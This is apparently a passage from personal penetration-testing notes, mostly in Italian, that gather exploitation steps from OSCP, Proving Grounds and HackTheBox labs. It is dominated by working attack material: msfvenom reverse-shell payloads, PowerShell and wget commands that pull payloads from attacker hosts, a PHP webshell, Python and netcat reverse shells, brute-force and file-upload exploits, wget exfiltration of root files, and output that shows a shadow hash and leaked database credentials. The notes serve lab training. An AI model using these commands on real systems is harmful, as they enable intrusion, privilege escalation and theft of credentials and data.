        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

START_TYPE -> AUTO_START

se il nostro utente ha i privilegi di riavviare il sistema si può usare **Unquoted Service Path**

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.102 LPORT=3306 -f exe > Foxit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

```

```
C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.102:3306/Foxit.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.102:3306/Foxit.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"


C:\UnrealTournament\System>dir "C:\Program Files (x86)\Foxit Software\"
dir "C:\Program Files (x86)\Foxit Software\"
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Program Files (x86)\Foxit Software

06/12/2021  05:39 AM    <DIR>          .
06/12/2021  05:39 AM    <DIR>          ..
10/07/2015  04:05 AM    <DIR>          Foxit Reader
06/12/2021  05:39 AM             7,168 Foxit.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  13,052,895,232 bytes free

C:\UnrealTournament\System>shutdown /r
shutdown /r


(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ sudo nc -lnvp 3306
listening on [any] 3306 ...
connect to [192.168.49.102] from (UNKNOWN) [192.168.102.44] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


Altro modo per controllare le info dei servizi che hanno come startmode "Auto":
```
wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
Foxit Cloud Safe Update Service                         FoxitCloudUpdateService         C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe          Auto       
```

Per vedere i servizi:
```
wmic service list brief
```


### IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) - Missing DLL (Windows)

First we will check if the IKEEXT service exists, is enabled, and running:
```
C:\UnrealTournament\System>sc query IKEEXT
sc query IKEEXT

SERVICE_NAME: IKEEXT
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\UnrealTournament\System>
```

Next, we need to check if the wlbsctrl.dll file exists in the system (and does not exist):
```
C:\UnrealTournament\System>dir wlbsctrl.dll /s
dir wlbsctrl.dll /s
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB
File Not Found
```

Next, we will check the PATH variable:
```
C:\UnrealTournament\System>PATH
PATH
PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
```

The directories *C:\Python\Scripts* and *C:\Python* are interesting, and we will check their permissions:
```
C:\UnrealTournament\System>icacls C:\Python\Scripts\
icacls C:\Python\Scripts\
C:\Python\Scripts\ BUILTIN\Administrators:(I)(F)
                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                   BUILTIN\Users:(I)(OI)(CI)(RX)
                   NT AUTHORITY\Authenticated Users:(I)(M)
                   NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\UnrealTournament\System>icacls C:\Python\
icacls C:\Python\
C:\Python\ BUILTIN\Administrators:(I)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           NT AUTHORITY\Authenticated Users:(I)(M)
           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

Both folders have the Modify permission granted for NT AUTHORITY\Authenticated Users so we can use either of them to write our custom wlbsctrl.dll file:
```
root@kali:~/Documents/VulnHub/UT99# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=4445 -f dll > wlbsctrl.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
```

Upload the payload:
```
C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
dir /B C:\Python\wlbsctrl.dll
File Not Found

C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"


C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
dir /B C:\Python\wlbsctrl.dll
wlbsctrl.dll
```

Finally, we will set up a netcat listener and then power cycle the machine to catch the privileged reverse shell.
```
C:\UnrealTournament\System>shutdown -r -t 10 && exit
shutdown -r -t 10 && exit
root@kali:~#


root@kali:~# nc -lvp 4445
listening on [any] 4445 ...
192.168.120.84: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.84] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



### Platronics Hub app (version 3.13.2)
MeatHead di Providing Grounds.
https://zeyu2001.gitbook.io/pentesting/proving-grounds/try-harder/meathead
https://www.exploit-db.com/exploits/47845


- Open cmd.exe 
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
            
Per l'ultimo step, copio un config file a caso e lo rinomino dopo aver inserito:
jane|advertise|C:\Windows\System32\cmd.exe

perchè se creavo un file di testo, non lo vedeva come config e quindi non funzionava (Windows stronzo!)

Ed esegue cmd come amministratore.


### phpLiteAdmin v1.9.3

Se non si ha una password, si può fare bruteforce perchè richiede solo la password quindi si può usare un username a caso:
```
hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

Altrimenti se si accede:
https://v3ded.github.io/ctf/zico2
Praticamente si crea un nuovo database chiamato "hack.php" (il nome è indifferente, basta che ci sia l'estensione .php) e si inserisce poi una tabella con un solo field con il valore di default con codice php.
Per esempio:
```
`<?php system("wget 192.168.119.168:8000/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>`
```

Ovviamente il file deve essere accessibile per poter essere chiamato.
Ad esempio nella macchina del lab Dotty, c'era una web app con Cuppa CMS che era vulnerabile a LFI e quindi si poteva usare per accedere al file che si caricava.

### Cuppa CMS
https://www.exploit-db.com/exploits/25971

Riprendendo l'esempio che ho fatto nella sezione phpLiteAdmin v1.9.3, il file caricato, veniva richiamato così:
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../usr/local/databases/hack.php


### Webmin / Usermin Arbitrary File Disclosure Vulnerability
/usr/share/exploitdb/exploits/multiple/remote/1997.php

```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Fc4]
    └─$ php 1997.php 10.11.1.141 10000 http /etc/shadow
    Attacking 10.11.1.141
    ---------------------------------
    root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::
    bin:*:13653:0:99999:7:::
    daemon:*:13653:0:99999:7:::
    adm:*:13653:0:99999:7:::
    lp:*:13653:0:99999:7:::
    sync:*:13653:0:99999:7:::
    shutdown:*:13653:0:99999:7:::
    halt:*:13653:0:99999:7:::
    mail:*:13653:0:99999:7:::
    news:*:13653:0:99999:7:::
    uucp:*:13653:0:99999:7:::
    operator:*:13653:0:99999:7:::
    games:*:13653:0:99999:7:::
    gopher:*:13653:0:99999:7:::
    ftp:*:13653:0:99999:7:::
    nobody:*:13653:0:99999:7:::
    dbus:!!:13653:0:99999:7:::
    vcsa:!!:13653:0:99999:7:::
    rpm:!!:13653:0:99999:7:::
    haldaemon:!!:13653:0:99999:7:::

    [...]
```

#### Webmin Autenticato
Esempio: https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webshell-upload-path-5

Se si ha accesso (magari con credenziali trovate in giro), e si ha la possibilità di creare cron schedulati o eseguire comandi come un utente, si può quindi inserire qualche comando per fare reverse shell come root:

![webminAuth](/assets/img/posts/webminAuth.webp)


### Timeclock software
By searching online the timeclock software, we find a **script to run a sql injection to find the admin password**:
https://github.com/timip/exploit/blob/master/timeclock.py

We (maybe) run more than one time to retreive the password:
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Fw_dev]
    └─$ python timeclock.py 10.11.1.252 8000
    Running!
    GY5sziW2uP9LHyv
    Done! Try Harder!
```


### CoreHTTP Server Version 0.5.3.1 and Below
https://github.com/tobor88/Bash/blob/master/corehttp-rev-shell.sh


### WordPress exploit plugin:
https://dl.packetstormsecurity.net/papers/attack/exploiting-uploads.pdf


### elastix-2.2
https://www.exploit-db.com/exploits/18650

Se lo script dà questi errori:
```
IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
IOError: [Errno socket error] [SSL: DH_KEY_TOO_SMALL] dh key too small (_ssl.c:727)
```
Aggiungere nello script:
```
> ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
> ctx.set_ciphers('HIGH:!DH:!aNULL') 
> urllib.urlopen(url, context=ctx)
```
Se dà
```
urllib2.URLError: <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)>
```
aggiungi:
```
context = ssl._create_unverified_context()
```
E poi eseguire dopo aver messo un listener:
```
python2.7 18650.py  
```

Vedi esempio anche https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webshell-upload-path-5

### Elastix 2.2.0

Elastix 2.2.0 - 'graph.php' Local File Inclusion 	| exploits/php/webapps/37637.pl   

searchsploit -x exploits/php/webapps/37637.pl shows an local file include (LFI) in the /vtigercrm/graph.php page. The current_language parameter points to a file, and it looks like there’s no filtering of ../ and I can pass %00 to truncate the string. That %00 suggests that the PHP is taking the input and appending .php to it before it includes. On really old PHP instances, adding %00 would truncate the string, so the .php would be ignored.

Vedi esempio https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webshell-upload-path-5

### RealVNC 4.1.0/4.1.1 

https://www.exploit-db.com/exploits/36932
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Jd]
    └─$ python 36932.py 10.11.1.227 5900
    [*] Hello From Server: RFB 003.008
    
    [*] The remote VNC service is vulnerable
    [*] Listener Socket Bind Complete
    [*] Launching local vncviewer
    [*] Listener waiting for VNC connections on localhost
    Connected to RFB server, using protocol version 3.8
    [*] Auth Methods Recieved. Sending Null Authentication Option to Client
    No authentication needed
    [*] Proxying data between the connections...
    Authentication successful
    Desktop name "JD"
    VNC server default format:
      32 bits per pixel.
      Least significant byte first in each pixel.
      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
    Using default colormap which is TrueColor.  Pixel format:
      32 bits per pixel.
      Least significant byte first in each pixel.
      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
    Same machine: preferring raw encoding
```
This open a windows with tightVNC

### ApPHP MicroBlog 1.0.1
Remote Command Execution 
https://www.exploit-db.com/exploits/33070

```
┌──(kali㉿kali)-[~/Documents/OSCP/Jeff]
    └─$ python 33070.py http://10.11.1.223/index.php                                   1 ⨯
      -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
    original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
    [*] Testing for vulnerability...
    [+] Website is vulnerable
    
    [*] Fecthing phpinfo
    	PHP Version 5.6.40
    	System   Windows NT JEFF 6.2 build 9200 (Windows Server 2012 Standard Edition) AMD64
    	Loaded Configuration File   C:\xampp\php\php.ini
    	Apache Version   Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40
    	Server Root   C:/xampp/apache
    	SystemRoot   C:\Windows
    	DOCUMENT_ROOT   C:/xampp/htdocs
    	PHP Version   5.6.40
    	allow_url_fopen  On  On
    	allow_url_include  Off  Off
    	disable_functions   no value    no value
    	open_basedir   no value    no value
    	SystemDrive   C:
    	SystemRoot   C:\Windows
    	System V Message based IPC   Wez Furlong
    	System V Semaphores   Tom May
    	System V Shared Memory   Christian Cartus
    
    [*] Fetching include/base.inc.php
    <?php
        
        define('DATABASE_HOST', 'localhost');           // Database host
        define('DATABASE_NAME', 'blog');           // Name of the database to be used
        define('DATABASE_USERNAME', 'root');       // User name for access to database
        define('DATABASE_PASSWORD', 'dsfdfkj435dgf');   // Password for access to database
        
        define('DB_PREFIX', 'mb_');		        // Unique prefix of all tables in the database
    
        define("PASSWORDS_ENCRYPTION_TYPE",  "AES");  // AES|MD5
        define("PASSWORDS_ENCRYPTION",  true);              // true|false
        define("PASSWORDS_ENCRYPT_KEY", "apphp_microblog");
        
    ?>
    
    [*] Testing remote execution
    [+] Remote exec is working with system() :)
    Submit your commands, type exit to quit
    >
```
E si può creare una reverse shell



### OTRS 5.0.x/6.0.x
Remote Command Execution
https://www.exploit-db.com/exploits/43853
Come dice lo script:
We navigate the url:
http://10.11.1.39/otrs/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework;#PGP::Options

and in the option, we insert:
 PGP 			yes
 PGP::Bin 		/bin/python
 PGP::Options 	-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.168",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


We start a listener
nc -lnvp 443

and we navigate the page:
10.11.1.39/otrs/index.pl?Action=AdminPGP


### ColdFusion 8
https://nets.ec/Coldfusion_hacking
https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/

#### Unauthenticated RCE
https://0xdf.gitlab.io/2020/05/19/htb-arctic.html

ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                       \| cfm/webapps/16788.rb

Questo exploit si può rifare con curl:
```
curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
```

E poi si esegue:
```
curl 'http://10.10.10.11:8500/userfiles/file/df.jsp'
```

settando prima un listener:
```
root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:50028.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```


#### Leak Hash, Upload JSP
Vedi anche: https://0xdf.gitlab.io/2020/05/19/htb-arctic.html

We find online that the version is vulnerable to LFI. Indeed by using this:
**?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en** all'url: 
http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

We obtain credentials (per un esempio vedi lab OSCP: Mike).
```
Once logged in, go to the "Mappings" section of the "Settings" section and copy the value of the Directory Path of the Logical Path / CFIDE, that is
 **C:\Inetpub\wwwroot\CFIDE**  
 
We generate a payload that we use later:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444 -f raw > shell.jsp


Now go to the Scheduled Task section of the Debugging & Logging section and add a scheduled task:
Name: ShellTask (any name is fine)
URL: http://192.168.119.168:8000/shell.jsp
File: C:\Inetpub\wwwroot\CFIDE\shell.jsp

Check the ** "Save output to a file" ** box and change the execution time to make it start immediately.
```


### Advanced Comment System 1.0
Remote File Inclusion Vulnerability 
https://www.exploit-db.com/exploits/9623

(Lab OSCP: Phoenix)


### jquery-file-upload
si può sfruttare per caricare qualche file sul server utilizzando curl:
curl -F "files=@/home/kali/Documents/OSCP/XOR-APP59/test.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/index.php

Quindi, si può caricare uno script per eseguire una reverse shell:
<?php system('nc.exe 192.168.119.168 4444 -e cmd.exe');?>

Carico sia questo script che nc.exe, metto in listening la mia macchina e poi navigo la pagina:
https://10.11.1.123/Books/apps/jquery-file-upload/server/php/files/test.php


### UnixSamba 2.2.7a
(Vedi Lab OSCP: XOR-APP59)
https://www.exploit-db.com/exploits/22469

```
└─$ gcc 22469.c -o 22469

└─$ ./22469 -t 10.11.1.115

[~] 0x333hate => samba 2.2.x remote root exploit [~]
[~]        coded by c0wboy ~ www.0x333.org       [~]

[-] connecting to 10.11.1.115:139
[-] stating bruteforce

[-] testing 0xbfffffff
[-] testing 0xbffffdff
[-] testing 0xbffffbff
[-] testing 0xbffff9ff
[-] testing 0xbffff7ff
[-] testing 0xbffff5ff
[-] testing 0xbffff3ff
[-] testing 0xbffff1ff
[-] testing 0xbfffefff
Linux tophat.acme.com 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686 athlon i386 GNU/Linux
uid=0(root) gid=0(root) groups=99(nobody)
```

### Samba 4.x
(Vedi Lab OSCP: Susie)
Con Metasploit: exploit/linux/samba/is_known_pipename

Se all'esecuzione dà questo errore:
```
Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.
```

Si deve settare:
```
set SMB::ProtocolVersion 1 
```

potrebbe servire per fixare, anche:
```
set SMB::AlwaysEncrypt false
```


### Samba version 3.0.24
Directory Traversal (con Metasploit)
https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/

Questa crea un symlink nella directory smb con dentro i file del server.
Quindi, poi, collegandosi in smb si troverà la cartella rootfs in cui ci sono le cartelle di filesystem:
```
    smb: \> cd rootfs
    smb: \rootfs\> ls
      .                                   D        0  Wed Aug 26 05:54:18 2009
      ..                                  D        0  Wed Aug 26 05:54:18 2009
      cdrom                               D        0  Wed Sep  5 19:43:19 2007
      var                                 D        0  Wed Sep  5 19:45:53 2007
      selinux                             D        0  Wed Mar  7 17:56:09 2007
      home                                D        0  Sun Oct  5 19:21:51 2008
      root                                D        0  Fri Mar 12 09:48:33 2021
      vmlinuz                             N  1719072  Sat Aug 29 17:03:53 2009
      lib                                 D        0  Tue Sep 20 02:37:34 2011
      bin                                 D        0  Sun Oct  5 13:45:56 2008
      sys                                 D        0  Wed Mar 10 14:50:37 2021
      srv                                 D        0  Wed Sep  5 19:45:52 2007
      tmp                                 D        0  Fri Mar 12 10:00:02 2021
      lost+found                          D        0  Wed Sep  5 19:43:02 2007
      media                               D        0  Wed Sep  5 19:43:21 2007
      sbin                                D        0  Wed Jan 17 07:52:40 2018
      etc                                 D        0  Wed Mar 10 14:50:56 2021
      initrd.img.old                      N  4877928  Wed Jan 17 07:52:26 2018
      opt                                 D        0  Wed Sep  5 19:45:52 2007
      proc                               DR        0  Wed Mar 10 14:50:37 2021
      mnt                                 D        0  Thu Sep 29 22:23:45 2011
      vmlinuz.old                         N  1455672  Mon Oct 13 04:59:16 2008
      initrd                              D        0  Wed Sep  5 19:45:52 2007
      boot                                D        0  Tue Nov 26 21:14:44 2019
      initrd.img                          N  4917486  Tue Nov 26 21:14:44 2019
      usr                                 D        0  Wed Sep  5 19:45:53 2007
      dev                                 D        0  Wed Mar 10 14:50:56 2021
```
Poi si potrebbe prendere il file **authorized_keys** e applicare l'attacco Debian OpenSSL Predictable PRNG.


### Debian OpenSSL Predictable PRNG
(Vedi Lab OSCP: Sufferance)
https://osandamalith.com/2013/11/16/rooting-pwnos/
https://github.com/g0tmi1k/debian-ssh

In cui si possono utilizzare delle liste di chiavi private,pubbliche che corrispondono al contenuto nel file authorized_keys.
Prima si cerca quale algoritmo è stato utilizzato:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ ssh-keygen -l -f authorized_keys
1024 SHA256:pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4 bob@10.11.1.136 (DSA)
```

Poi si scarica la lista dal link https://github.com/g0tmi1k/debian-ssh e si cerca la chiave pubblica relativa a quella chiave:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ cd dsa/1024 

┌──(kali㉿kali)-[~/…/OSCP/Sufferance/dsa/1024]
└─$ grep -lr AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9/dQ7ck2gLUqPu2F4gfXml8W9RKcqTOVksRmQ5s0O4c88mCqV3F1nzKKMSZbK9yYWbafabX91f2SinBQZbfMGv8+R2TyE78LjAAAAFQDXtJ7Pca0RkEBFcBLfPzmCUBpSeQAAAIEAlK4NYlfGt3uInBaKG0kK/N0nZwX7ji++5xSiLLjI/0M9xacdWaZcPBZ4GretGGIhnYEPlBote8GlG1Ap7li39ATazIXJQguG+Mgun3de73RugX/oGsUt5oatCS2Lo9mfRBijlVYChLyQbgkZMwKziwR1BHUWE/jkCKT7bPEJvw8AAACBAJZHIWHJybvrIcs9oB5hTL/8r+C9gDx+R3vcEFQq58D/UDi5FWzA71IZfcOt2+EPabP77gB6Ad/nNy3BrqmkocwLX+Of1uwMhgD63UeE5fUOuIbW+z4OF1M9tuzFAGALDMHJSx8U8Z11lsiuO4Owx11pAo8Ebq0sKNDd0GzvVQxE *.pub

f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
```

E poi si utilizza per accedere:
```
┌──(kali㉿kali)-[~/…/OSCP/Sufferance/dsa/1024]
└─$ ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136 -oKexAlgorithms=+diffie-hellman-group1-sha1 -vv -oPubkeyAcceptedKeyTypes=+ssh-dss

[...]
```


### Encrypted SSH key
Se si trova una chiave in cui all'inizio c'è la stringa **Proc-Type: 4,ENCRYPTED**, ad esempio:
```
root@kali:~/hackthebox/valentine-10.10.10.79# cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Si può provare a decifrarlo usando:
```
openssl rsa -in hype_key_encrypted -out hype_key_decrypted
```

Questo comdando può chiedere una password, vedi esempio https://0xdf.gitlab.io/2018/07/28/htb-valentine.html


### Tmux
Se si ha come processo **tmux**:
```
hype@Valentine:~$ ps -ef | grep tmux
root       1022      1  0 Jul25 ?        00:00:54 /usr/bin/tmux -S /.devs/dev_sess
```

E nel .bash_history si hanno comandi come:
```
    9  tmux -L dev_sess
   10  tmux a -t dev_sess
   11  tmux --help
   12  tmux -S /.devs/dev_sess
   13  exit
   14  tmux ls
```

Si può provare ad utilizzare i comandi per aprire una shell (in questo caso con privilegi perchè il processo è eseguito come root).
Esempio preso da https://0xdf.gitlab.io/2018/07/28/htb-valentine.html


### Privesc with Wget
Esempi presi da: https://0xdf.gitlab.io/2018/09/29/htb-sunday.html


**--input-file**
When it reads the hash, the string will fail to process as a url, and will tell us so in an error message, complete with flag:
```
sammy@sunday:~$ sudo wget --input-file /root/root.txt
/root/root.txt: Invalid URL fb40fab6...: Unsupported scheme
No URLs found in /root/root.txt.
```

**Post Flag**
```
sammy@sunday:~$ sudo wget --post-file /root/root.txt http://10.10.14.5:443/
--00:52:35--  http://10.10.14.5:443/
           => `index.html'
Connecting to 10.10.14.5:443... connected.
HTTP request sent, awaiting response...
```
E nella macchina attaccante:
```
root@kali:~/pwk/lab/public# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 49337
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.5:443
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab6...
```

**Overwrite file**
Per esempio, si ha il file:
```
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```
Quindi vogliamo fare sovrascrivere quel /root/troll con una reverse shell:
shell.py
```
#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

E poi nella macchina vittima:
```
sammy@sunday:~$ sudo wget http://10.10.14.5/shell.py -O /root/troll
--01:07:04--  http://10.10.14.5/shell.py
           => `/root/troll'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 246 [text/plain]

100%[==========================================================================================================================================================================================================>] 246           --.--K/s

01:07:04 (25.59 MB/s) - `/root/troll' saved [246/246]
```

E poi eseguire:
```
sunny@sunday:~$ sudo /root/troll
```

E nella macchina attaccante:
```
root@kali:~/hackthebox/sunday-10.10.10.76# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 56164
root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

**Overwrite Different SUID Binary**
```
sammy@sunday:~$ cp /usr/bin/passwd /tmp
sammy@sunday:~$ ls -la /usr/bin/passwd
